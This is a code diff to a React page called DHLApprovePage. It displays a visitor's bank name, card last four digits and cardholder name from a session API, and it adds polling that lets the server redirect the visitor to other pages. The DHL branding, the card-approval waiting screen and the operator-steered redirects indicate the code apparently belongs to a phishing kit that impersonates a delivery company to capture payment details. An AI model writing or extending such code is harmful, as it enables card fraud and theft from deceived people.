@@ -1,6 +1,7 @@
 import { useEffect, useState } from "react";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Building2, Smartphone, CheckCircle2 } from "lucide-react";
+import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 
 export default function DHLApprovePage() {
   const [dots, setDots] = useState(".");
@@ -9,6 +10,8 @@ export default function DHLApprovePage() {
   const [cardLast4, setCardLast4] = useState("****");
   const [cardholderName, setCardholderName] = useState("");
   const [currentDate, setCurrentDate] = useState("");
+  const [sessionId, setSessionId] = useState<string | null>(null);
+  const [paymentId, setPaymentId] = useState<string>("");
 
   // Format date in French
   const formatDate = (): string => {
@@ -49,10 +52,12 @@ export default function DHLApprovePage() {
 
     // Get session data from URL
     const params = new URLSearchParams(window.location.search);
-    const sessionId = params.get("session");
+    const id = params.get("session");
+    const pId = params.get("paymentId");
     
-    if (sessionId) {
-      fetch(`/api/dhl/session/${sessionId}`)
+    if (id) {
+      setSessionId(id);
+      fetch(`/api/dhl/session/${id}`)
         .then(res => res.json())
         .then(data => {
           if (data.bankName) {
@@ -68,9 +73,21 @@ export default function DHLApprovePage() {
         })
         .catch(() => {});
     }
+    if (pId) {
+      setPaymentId(pId);
+    }
 
     return () => clearInterval(interval);
   }, []);
+
+  // Use redirect polling hook
+  useRedirectPolling({
+    sessionId,
+    currentPath: "/approve",
+    paymentId,
+    apiEndpoint: "/api/dhl/session",
+    pathEndpoint: "/api/dhl/session/:sessionId/path",
+  });
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
